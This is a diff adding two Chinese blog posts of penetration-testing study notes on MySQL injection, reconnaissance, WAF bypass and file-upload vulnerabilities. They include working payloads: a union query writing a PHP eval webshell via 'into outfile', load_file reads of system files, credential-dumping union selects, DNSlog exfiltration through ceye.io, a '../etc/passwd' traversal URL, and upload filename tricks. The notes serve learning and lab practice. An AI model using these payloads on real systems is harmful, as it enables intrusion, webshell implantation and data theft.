@@ -348,6 +348,911 @@
 
 
   
+    <article id="post-mysql注入查询" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/01/25/mysql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2/">mysql注入查询</a>
+    </h1>
+  
+
+        
+        <a href="/2023/01/25/mysql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2/" class="archive-article-date">
+  	<time datetime="2023-01-25T02:51:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-01-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <span id="more"></span>
+
+<h2 id="mysql注入查询"><a href="#mysql注入查询" class="headerlink" title="mysql注入查询"></a>mysql注入查询</h2><ol>
+<li><p>查询数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version()</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>数据库名字 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">databaase()</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>数据库用户 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user()</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>操作系统 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询当前用户是否具有文件权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user=&quot;root&quot; and host=&quot;localhost&quot;--+</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>读取文件操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_file(&#x27;文件路径&#x27;)</span><br><span class="line">[… union select 1,load_file(&#x27;C:\\Windows\\System32\\drivers\\etc\\hosts&#x27;),3 --+]</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>写入文件操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">into outfile</span><br><span class="line">[… union select 1,&#x27;&lt;?php @eval($_REQUESTS[777]);?&gt;&#x27;,3 into outfile &#x27;c:\\phpstudy\\www\\2.php&#x27;  ]</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询所有数据库（在information_schema.schemata表中存放着所有数据库信息）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=adasdasdmin&#x27; union select group_concat(schema_name), database() from information_schema.schemata#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询数据库中所有表（在information_schema.tables表中存放着所有表的信息）（字段table_schema代表这张表的来源数据库）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=adasdasdmin&#x27; union select group_concat(table_name), database() from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询表中所有字段（在information_schema.columns表中存放着所有字段的信息）（字段table_schema代表这个字段的来源数据库，table_name表示字段所属的表）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=adasdasdmin&#x27; union select group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=adasdasdmin&#x27; union select group_concat(username,&#x27;:&#x27;,password), database() from users#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/01/25/mysql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-小迪安全笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/01/25/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">小迪安全笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2023/01/25/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2023-01-25T02:51:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-01-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <span id="more"></span>
+
+<h2 id="信息收集-导入"><a href="#信息收集-导入" class="headerlink" title="信息收集(导入)"></a>信息收集(导入)</h2><h3 id="为什么要信息收集"><a href="#为什么要信息收集" class="headerlink" title="为什么要信息收集"></a>为什么要信息收集</h3><p>信息收集对于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>前期来说是非常重要的，因为只有我们掌握了目标网站或目标主机足够多的信息之后，我们才能更好地对其进行漏洞检测。正所谓，知己知彼百战百胜！</p>
+<p>没有掌握网站基本信息就开始很可能是在做无用功，渗透的目标都不一定正确</p>
+<p>网站在解析时一般使用域名解析到网站的目录文件，而IP又能直接访问网站，所以使用IP扫描网站和使用域名扫描网站的目录可能不同，扫描时建议使用IP进行</p>
+<h3 id="CDN检测与绕过"><a href="#CDN检测与绕过" class="headerlink" title="CDN检测与绕过"></a>CDN检测与绕过</h3><p>使用超级ping工具(<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedtest)%E6%9F%A5%E7%9C%8B%E5%90%84%E5%9C%B0%E5%8C%BAip%E6%98%AF%E5%90%A6%E4%B8%8D%E5%90%8C%E3%80%82">http://tool.chinaz.com/speedtest)查看各地区ip是否不同。</a></p>
+<p>cmd下nslookup 域名查看是否会有很多节点。</p>
+<p>绕过方法：</p>
+<ol>
+<li><p>子域名查询：有的网站主域名会做CDN，但是子域名可能不会做</p>
+</li>
+<li><p>邮件服务查询：我们访问别人，可能通过cdn，但别人访问我们通常不会走cdn</p>
+</li>
+<li><p>国外地址请求：国外没有cdn节点的话，可能直接走原ip</p>
+</li>
+<li><p>遗留文件，扫描全网</p>
+</li>
+<li><p>黑暗引擎搜索特定文件</p>
+</li>
+<li><p>dns历史记录</p>
+</li>
+<li><p>以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</p>
+</li>
+</ol>
+<p>子域名上面的小技巧:</p>
+<ol>
+<li><p>查询时加主机名查询与不加主机名查询结果可能不同，如（<a target="_blank" rel="noopener" href="http://www.xueersi.com/">www.xueersi.com</a>和xueersi.com）</p>
+</li>
+<li><p>DNs历史记录&#x3D;第三方接口(接口查询)</p>
+</li>
+<li><p>主域名和子域名查询到的可能不一样，如(<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/subdomain)%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99%E5%AD%90%E5%9F%9F%E5%90%8D">http://tools.bugscaner.com/subdomain)收集网站子域名</a></p>
+</li>
+<li><p>采集&#x2F;国外请求( 同类型访问) ,如（get-site-ip.com）</p>
+</li>
+<li><p>邮件源码测试对比第三方查询(地区分析)</p>
+</li>
+<li><p>黑暗引擎(shodan搜指定hash文件)</p>
+</li>
+<li><p>扫全网 </p>
+</li>
+<li><p>工具扫描， 如：fuckcdn，w8 fuckcdn，zmap等</p>
+</li>
+<li><p>认为判定，根据网站的域名备案推测</p>
+</li>
+<li><p>本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</p>
+</li>
+</ol>
+<h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><ol>
+<li><p>搜索网站是否为开源cms</p>
+</li>
+<li><p>判断网站的操作系统</p>
+</li>
+<li><p>判断网站的搭建平台</p>
+</li>
+<li><p>判断网站使用的数据库类型</p>
+</li>
+<li><p>判断网站开放的服务接口</p>
+</li>
+<li><p>判断网站存在的第三方应用</p>
+</li>
+<li><p>判断网站开放的服务接口</p>
+</li>
+<li><p>通过站点搭建分析获取关联站点</p>
+</li>
+<li><p>判断网站采用的防护应用（waf）</p>
+</li>
+<li><p>判断是否有APP，尝试从APP提取或反编译逆向</p>
+</li>
+<li><p>搜集各种资产信息，通过各种平台搜索证书，备案信息，github监控，枚举爆破，黑暗引擎搜索，微信公众号等方式</p>
+</li>
+<li><p>加入内部钉钉、微信、QQ等群组</p>
+</li>
+</ol>
+<h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ol>
+<li><p>搭建习惯-目录型站点（主站和子站的搭建平台可能不同但都搭建在同一台主机上）</p>
+</li>
+<li><p>搭建习惯-端口类站点（同一台主机不同端口下可能放着不同程序搭建的网站，如80和8080）</p>
+</li>
+<li><p>搭建习惯-子域名站点（不同子域名的其他网站的搭建平台可能不同，但也有可能两个网站不在同一服务器上，也可能在同一网段，如bbs.xx.com和<a target="_blank" rel="noopener" href="http://www.xx.com)/">www.xx.com）</a></p>
+</li>
+<li><p>搭建习惯-类似域名站点（猜测或查询该网站曾用域名，如该网站换过顶级域xxx.cn&#x2F;xxx.com，或一级域换成更简洁的缩写jingdong.xxx&#x2F;jd.xxx等）</p>
+</li>
+<li><p>搭建习惯-旁注, c段站点(旁注:同服务器不同站点，c段:同网段不同服务器不同站点)</p>
+</li>
+<li><p>搭建习惯-搭建软件特征站点（网站可能采用一键搭建软件所搭建，如宝塔、phpstudy等）</p>
+</li>
+</ol>
+<h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><ol>
+<li><p>Whois信息查询,可以通过在线工具查询网站的备案信息，通过备案信息查询到注册该站点的人同时还注册过哪些站点。</p>
+</li>
+<li><p>IP反查域名，通过在线工具使用IP地址反查出网站域名</p>
+</li>
+<li><p>黑暗引擎，使用shodan、fofa、钟馗之眼查询网站地址、网站名、关键字等能够获取到不限于相关网站、网站开放端口等重要信息。</p>
+</li>
+<li><p>相关软件，使用teemo注册相关网站用户后自动化查询，或使用Layer等工具进行子域名爆破。</p>
+</li>
+<li><p>证书查询，查询网站证书也可以查到相关子域名信息</p>
+</li>
+</ol>
+<h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><p>wechat_push脚本连接server酱可以推送查询结果至企业微信。修改代码中的查询项可以便于收集整理最新exp或poc 、发现相关测试目标的资产等</p>
+<h2 id="SQL注入-导入"><a href="#SQL注入-导入" class="headerlink" title="SQL注入(导入)"></a>SQL注入(导入)</h2><h3 id="认识SQL注入"><a href="#认识SQL注入" class="headerlink" title="认识SQL注入"></a>认识SQL注入</h3><p>sql注入就是在数据交互中，<strong>前端数据传到后台时没有做严格的判断</strong>，导致传进来的<strong>数据被拼接到sql语句中</strong>，<strong>被当作sql语句的一部分进行执行</strong>，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。</p>
+<p>SQL注入的条件：变量可控，带入数据库查询，未对变量进行过滤或过滤不严谨</p>
+<h3 id="简要认识"><a href="#简要认识" class="headerlink" title="简要认识"></a>简要认识</h3><p>1.明确参数类型：<br> 数字，字符，搜索，JSON等，数字可以直接加在sql中，字符就要通过引号接入sql语句中</p>
+<p>2.明确请求方法：</p>
+<p>GET, POST, COOKIE, REQUEST, HTTP头等<br> 其中SQI语句干扰符号: ‘, “, %, ), } 等，具体需看写法</p>
+<p>‘“]})可以作为默认测试写法</p>
+<p>3.简要学习各种数据库的注入特点：<br> 常见数据库有：Access, mysql ,mssql(sql server),mongoDB, postgresql, sqlite,oracle, sybase等。<br> Access数据库只有自身一个数据库无法做高权限注入</p>
+<p>MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。数据传输采用JSON传输。</p>
+<p>数据库架构组成，数据库有高权限操作</p>
+<p>4.简要学习各种注入工具的使用指南<br> 熟悉工具的支持库，注入模式，优缺点等<br> Sqlmap, NoSQLAttack, Pangolin等</p>
+<h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><p> 注入方式大概分为五种：联合查询，报错注入，布尔盲注，延时注入，堆叠查询</p>
+<ol>
+<li><p>联合查询：</p>
+<p>由于数据库中的内容会回显到页面中，所以我们可以采用联合查询进行注入。联合查询就是SQL 语法中的union select 语句。该语句会同时执行两条select 语句，生成两张虚拟表，然后把查询到的结果进行拼接。</p>
+</li>
+<li><p>报错注入：</p>
+<p>在注入点的判断过程中，发现数据库中SQL语句的报错信息，会显示在页面中，因此可以进行报错注入。Updatexml(1,database(),1)</p>
+</li>
+<li><p>布尔盲注</p>
+<p>利用页面返回的布尔类型状态，正常或者不正常，and 1&#x3D;1 and 1&#x3D;2</p>
+</li>
+<li><p>延时注入</p>
+<p>利用sleep() 语句的延时性，以时间线作为判断条件</p>
+</li>
+<li><p>堆叠查询</p>
+<p>Sql语句中分号（;）是用来表示一条sql语句的结束。我们在 ; 结束一个sql语句后继续构造下一条语句就是堆叠注入</p>
+</li>
+<li><p>Dnslog注入</p>
+<p>将我们查询的信息当作主机头连接域名来访问读取，查看对应dns日志主机头部分就是查询的结果了。</p>
+</li>
+</ol>
+<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a><strong>DNSlog</strong></h3><p><strong>需要有文件读取的权限</strong>，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，这时候就可以尝试使用dnslog注入。</p>
+<p>使用<a target="_blank" rel="noopener" href="http://ceye.io/%E5%B9%B3%E5%8F%B0%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E5%AE%8C%E6%88%90dnslog%E7%9A%84%E6%B3%A8%E5%85%A5">http://ceye.io/平台来帮助我们完成dnslog的注入</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.148.165/sqli/Less-1/?id=-1%E2%80%99%25">http://192.168.148.165/sqli/Less-1/?id=-1’%</a> union select 1, load_file(concat(‘\\’,(select database()),’.abzrsx.ceye.io\abc’)),3–+</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.148.165/sqli/Less-9/?id=1%E2%80%99">http://192.168.148.165/sqli/Less-9/?id=1’</a> and if((select load_file(concat(‘\\’,(select database()),’.abzrsx.ceye.io\abc’))),1,0)–+</p>
+<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><ol>
+<li><p>更改数据包的方式绕过waf，有些限制条目只针对url，而不包含post提交的数据包，更改提交方式尝试绕过</p>
+</li>
+<li><p>静态资源，特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了检测效率，不去检测这样一些静态文件名后缀的请求。<br> <a target="_blank" rel="noopener" href="http://10.9.9.201/">http://10.9.9.201/</a> sql.php?id&#x3D;1<br> <a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a><br> 备注: Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php后面基本不识别IP白名单</p>
+</li>
+<li><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。<br> 测试方法:修改http的header来bypass waf<br> x-forwarded-for<br> x-remote-IP<br> x-originating-IP<br> x-remote-addr<br> x-Real-ip</p>
+</li>
+<li><p>url白名单，为了防止误拦，部分waf内置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势:<br> <a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/admin.php?id=1">http://10.9.9.201/sql.php/admin.php?id=1</a><br> <a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd">http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</a><br> <a target="_blank" rel="noopener" href="http://10.9.9.201/">http://10.9.9.201/../../../</a> manage&#x2F;..&#x2F;sql.asp?id&#x3D;2<br> waf通过&#x2F;manage&#x2F;“进行比较，只要url中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。</p>
+</li>
+<li><p>爬虫白名单，部分waf有提供爬虫白名单（各大浏览器的爬虫）的功能，识别爬虫的技术一般有两种:<br> 1、根据useragent<br> 2、通过行为来判断<br> UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。User Agent switcher (Firefox附加组件)，下载地址:<br> https : &#x2F;&#x2F;addons.mozilla.org&#x2F;en-us&#x2F;firefox&#x2F;addon&#x2F;user-agent-switcher&#x2F;</p>
+</li>
+<li><p>垃圾数据溢出，有的时候，由于数据太大，会导致waf无法将所有的数据都检测完，这个时候会忽略掉我们代入的sql注入语句，从而绕过waf，即：使用POST请求，对服务器请求很大资源逃逸sql注入语句</p>
+</li>
+<li><p>等价函数，实现一个功能可能有很多不同的函数可以完成，其它作用相同的函数可能没有被waf限制</p>
+</li>
+<li><p>大小写转换及等价替换，and-&gt;&amp;&amp; or-&gt;||</p>
+</li>
+<li><p>特殊符号，如~database()  database&#x2F;**&#x2F;() all</p>
+</li>
+<li><p>注释符混用，如 id&#x3D;-1%23x%0aunion%23x%0aselect%201,database%23x%0a(),3%23-&gt;#，%0a-&gt;换行注入结果为：id&#x3D;-1#x(换行)union#x(换行)select 1,database#x(换行)(),3</p>
+</li>
+<li><p>Mysql特性，在&#x2F;*!…*&#x2F; 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行如下</p>
+<p>Id&#x3D;-1 union &#x2F;*!44509select*&#x2F; 1,2,3  &#x2F;*!44509*&#x2F;：数据库版本在4.45.09以上&#x2F;*!…*&#x2F;内的代码会被执行</p>
+</li>
+</ol>
+<p>​	混合使用：id&#x3D;-1%20&#x2F;*!44509union*&#x2F;%23x%0aselect%201,2,3</p>
+<p>​	id&#x3D;-1%20union%20all &#x2F;*!50001select*&#x2F;%201,database&#x2F;***&#x2F;(),3</p>
+<ol start="12">
+<li><p>参数污染，http参数污染注入源于网站对于提交的相同的参数的不同处理方式导致，不同的服务器的处理结果主要分为三种：</p>
+<table>
+<thead>
+<tr>
+<th>Web服务器</th>
+<th>参数获取函数</th>
+<th>获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP&#x2F;Apache</td>
+<td>$_GET(“par”)</td>
+<td>Last</td>
+</tr>
+<tr>
+<td>JSP&#x2F;Tomcat</td>
+<td>Request.getParameter(“par”)</td>
+<td>First</td>
+</tr>
+<tr>
+<td>Perl(CGI)&#x2F;Apache</td>
+<td>$_Param(“par”)</td>
+<td>First</td>
+</tr>
+<tr>
+<td>Python&#x2F;Apache</td>
+<td>Getvalue(“par”)</td>
+<td>All(List)</td>
+</tr>
+<tr>
+<td>ASP&#x2F;IIS</td>
+<td>Request.QueryString(“par”)</td>
+<td>All(comma-delimited string)</td>
+</tr>
+</tbody></table>
+<p>如果时第三种情况，两个参数同时选择，两个参数会拼接到一起</p>
+<p>我的环境是php&#x2F;apache，最后一个参数为结果：</p>
+<p>id&#x3D;1&#x2F;**&amp;id&#x3D;-1%20union%20select%201,2,3%23*&#x2F;</p>
+<p>waf会把第二个参数当作注释不过滤，而mysql会从id&#x3D;-1 union开始读取当作参数执行</p>
+</li>
+<li><p>sqlmap过waf，sqlmap发送的数据包包带了自己的工具头，user-agent</p>
+<p>可以在注入时加参数—random，也可以使用搜索引擎的指纹头，使用搜索引擎的指纹头还可以防止waf限制访问流量，或使用中转注入</p>
+</li>
+<li><p>访问流量防护绕过，用工具注入时访问流量过大导致被网站拉黑</p>
+<p>采用延时的方法限制工具的注入速度，注入时加参数—delay 1</p>
+<p>或采用地址池的通过不同ip注入，也可以尝试伪装成搜索引擎的爬虫，网站一般对搜索引擎有白名单</p>
+</li>
+</ol>
+<h2 id="文件上传漏洞-导入"><a href="#文件上传漏洞-导入" class="headerlink" title="文件上传漏洞(导入)"></a>文件上传漏洞(导入)</h2><h3 id="初步认识"><a href="#初步认识" class="headerlink" title="初步认识"></a>初步认识</h3><p>存在文件上传功能的地方都能测试是否存在文件上传漏洞，但不是存在文件上传功能的地方都是文件上传漏洞。</p>
+<p>对文件上传进行归类便于更好的利用，主要分为四类：常规类、CMS类、编辑器类、其他类&#x2F;CVE类。</p>
+<ol>
+<li><p>常规类：通过敏感文件扫描获取上传地址、网站的会员中心通常会有文件上传的功能、网站后台可能会出现上传点、其他各种途径获取到的上传点</p>
+</li>
+<li><p>CMS类：已知对方网站搭建使用的CMS，寻找对应CMS报出过的漏洞和网站源码</p>
+</li>
+<li><p>编辑器类：寻找对应编辑器漏洞利用</p>
+</li>
+<li><p>其他类：代码审计、平台&#x2F;第三方应用等</p>
+</li>
+</ol>
+<h3 id="上传脚本文件"><a href="#上传脚本文件" class="headerlink" title="上传脚本文件"></a>上传脚本文件</h3><p>put方法上传文件：如果网站开启了http请求方法之一的put方法我们将可以直接通过put方法直接上传文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /info.php HTTP/1.1</span><br><span class="line">HOST:192.168.1.200</span><br><span class="line">Content-Length:18</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件上传常见验证点分为：后缀名、文件类型、文件内容头部信息等</p>
+<p>后缀名：黑名单、白名单</p>
+<p>文件类型：MIME信息，http请求头中使用Content-Type字段传递</p>
+<p>文件头：内容头部信息</p>
+<p>网站通过黑白名单对上传文件进行检测过滤</p>
+<p>判断过滤点是前端过滤还是后端过滤，前端代码是发送到客户端的我们可以随意修改，所以前端代码的过滤基本是无效的</p>
+<h4 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h4><ol>
+<li><p>使用不常用的等价后缀名（如：php3、php5）</p>
+</li>
+<li><p>上传.htaccess文件，.htaccess是能修改当前目录及子目录配置的分布式配置文件，限apache</p>
+</li>
+<li><p>上传的文件在匹配黑名单前没有大小写转换，可以通过大小写绕过</p>
+</li>
+<li><p>上传的文件没有首尾去空格，就可以绕过黑名单的检测，上传到服务器后会因操作系统创建文件时的规则自动去除末尾的空格</p>
+</li>
+<li><p>上传的文件没有去除末尾的‘.‘，就可以绕过黑名单的检测，上传到服务器后会因操作系统创建文件时的规则自动去除末尾的’.‘</p>
+</li>
+<li><p>上传的文件没有去::$DATA，“a.php::$DATA“上传后会因windows的规则不会检测后缀名，且保持::$DATA之前的文件名</p>
+</li>
+<li><p>如果网站的所有过滤条件都只执行一次就可以使用双写绕过，如：” a.php. .”、” a.pphphp”</p>
+</li>
+<li><p>1.php&#x2F;.代码过滤时会将1.php&#x2F;认为是文件夹.为文件，代码截取到的后缀名为空，而文件上传时如果使用的是我们传入的1.php&#x2F;.作为文件名在上传后系统会自动删除末尾的&#x2F;.从而实现绕过</p>
+</li>
+</ol>
+<h4 id="绕过白名单"><a href="#绕过白名单" class="headerlink" title="绕过白名单"></a>绕过白名单</h4><ol>
+<li><p>00截断，%00代表中止符，放在URL中传递后会自动解码，但如果使用POST传递就不会自动解码所以使用POST传递时需要将%00自行解码，%00是URL编码后的值，HEX（十六进制）表示为00,使用00截断需要php版本&lt;5.3.4</p>
+</li>
+<li><p>getReailFileType通过读文件的前2个字节判断文件类型，制作图片木马上传，如上传文件后后缀名只能上传图片格式就需要配合解析漏洞或包含漏洞一起使用</p>
+</li>
+<li><p>getimagesize函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE，将测定 GIF，JPG，PNG等等 图像文件的大小并返回图像的尺寸以及文件类型，同样通过文件头信息判断文件格式</p>
+</li>
+<li><p>exif_imagetype通过php_exif模块来判断文件类型，同样使用图片木马</p>
+</li>
+<li><p>imagecreatefromjpeg，同样使用图片木马</p>
+</li>
+<li><p>条件竞争漏洞，上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求则重命名，如果文件格式不符合要求将文件删除。由于代码执行需要时间，在代码执行过程中用户访问了上传的文件，文件被打开删除代码将无法正常将打开中的文件删除</p>
+</li>
+<li><p>代码将传递的文件名分割后存放在一个数组中，验证完后缀名后再将文件名与后缀名拼接，我们直接上传一个数组。数组中传递自定义的文件名与后缀名实现绕过检测，如：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">xx.php/</span><br><span class="line"></span><br><span class="line">-----------------------------189120705216995627741343929365</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[3]&quot;</span><br><span class="line"></span><br><span class="line">jpg</span><br></pre></td></tr></table></figure>
+
+<p> 因为分割后文件的后缀名会在数组的最后一位代码采用了count(数组)-1来取到后缀名，所以我们上传的数组的位数比数组中总元素的数量大拼接后缀名时就不会被拼接到上传的文件名就会是xx.php&#x2F;.而不是xx.php&#x2F;.jpg，xx.php&#x2F;.jpg会导致上传失败</p>
+<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>解析漏洞：Web 容器解析漏洞，就是Web 容器在解析脚本出现的“bug”，通过一些方法可以让网站将上传的图片格式解析成可以执行的后门代码格式。</p>
+<p>上传文件的后缀名决定网站通过哪种方式解析你所上传的文件。就算你将带有php后门的jpg文件成功上传，网站也只会当成jpg格式来解释php代码，后门代码将无法成功执行，如果网站存在解析漏洞就可以配合解析漏洞将上传的图片格式解析成后门代码的php格式。</p>
+<p>IIS6.x：*.asp;.jpg</p>
+<p>IIS7.x：test.jpg后面加上&#x2F;.php，会将test.jpg 解析为php文件</p>
+<p>Apache：phpinfo.php.xxx.xx.x，Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则 继续向左识别，直到识别到合法后缀才进行解析。</p>
+<p>具体可以参照文件《Web中间件常见漏洞总结》。</p>
+<h3 id="WAF绕过-1"><a href="#WAF绕过-1" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>绕过WAF最主要的思路在于不要让WAF匹配到filename中的文件名后缀，这是我们上传文件的文件名，防护软件通过匹配我们上传文件的后缀名来实现拦截。</p>
+<ol>
+<li><p>数据溢出：通过在filename字段前插入大量的垃圾数据来妨碍WAF匹配使WAF匹配到大量的垃圾数据而不匹配后面的文件名及后缀。如：**<code>asd124asfa….ad1241afa;filename=”1.php”</code>**</p>
+</li>
+<li><p>符号异变（’、”、;）：首先必须明确WAF软件和网站的匹配规则是由两套独立的不同的程序，一般代码会将“”或‘‘中的数据表示字符串，没有单双引号的字符串当作内置函数，**<code>filename=”1.php</code><strong>，通过删除最后一个双引号两个软件的匹配规则可能不同，php匹配到”1.php为文件名，而安全狗则可能根据最后一个引号向前匹配或没有匹配结束导致被绕过。分号;在数据包中代表还未结束指后面还有数据。在判断出WAF软件通过最后一个引号来匹配数据后我们绕过的方式就有很多了，如</strong><code>filename=1.php</code><strong>、</strong><code>filename=”asda”xxx.php</code>**</p>
+</li>
+<li><p>数据截断(%00、;、换行)：**<code>filename=”1.php%00.jpg”</code>**(注意%00需要手动URL编码)，安全狗匹配最后一个引号开始匹配到jpg而网站上传时匹配到.php就截断了所以成功绕过并上传文件1.php，</p>
+<p><strong><code>filename=”1.jpg;.php”</code></strong>,WAF认为到;是本条语句的结束，而网站会将1.jpg;.php这个整体当作文件名成功上传(我没有成功)，</p>
